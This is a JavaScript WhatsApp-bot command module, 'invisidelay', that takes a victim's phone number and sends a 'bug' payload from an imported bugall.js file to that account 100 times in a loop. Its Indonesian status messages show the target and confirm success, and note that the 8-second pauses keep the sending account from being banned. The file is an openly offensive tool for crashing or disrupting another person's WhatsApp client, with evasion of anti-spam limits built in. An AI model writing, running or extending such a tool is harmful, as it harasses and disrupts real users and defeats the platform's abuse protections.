import { bugall } from "../bugall.js"; // ton bugall intact

// Fonction sleep intégrée
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

export default {
  name: "invisidelay",
  description: "Envoie le bug Invisidelay",
  async execute(sock, m, args) {
    const prefix = ".";
    const q = args.join(" ");
    
    if (!q) {
      return await sock.sendMessage(
        m.key.remoteJid,
        { text: `Contoh: ${prefix}invisidelay 237xxxx` },
        { quoted: m }
      );
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const pureTarget = target.split("@")[0];

    const prosesText = `╔═══════════════════
║  Mengirim bug Invisidelay
╠═══════════════════
║ Target: wa.me/${pureTarget}
║ Status: ⏳ Mengirim bug Invisidelay
╚═══════════════════`;

    // Message initial
    await sock.sendMessage(
      m.key.remoteJid,
      { text: prosesText },
      { quoted: m }
    );

    // Boucle d'envoi du bug
    for (let i = 0; i < 100; i++) {
      try {
        await bugall.necroxenperma(target); // utilise asep = sock dans BugAll.js
      } catch (err) {
        console.error(`Erreur Invisidelay (#${i + 1}):`, err.message);
      }
      await sleep(8000); // pause 8 secondes
    }

    const selesaiText = `╔═══════════════════
║  Bug Invisidelay Terminé
╠═══════════════════
║ Target: wa.me/${pureTarget}
║ Status: ✅ Berhasil mengirim bug
║ Note: Jeda Agar Sender Tidak Kenon
╚═══════════════════`;

    // Message final
    await sock.sendMessage(
      m.key.remoteJid,
      { text: selesaiText },
      { quoted: m }
    );
  }
};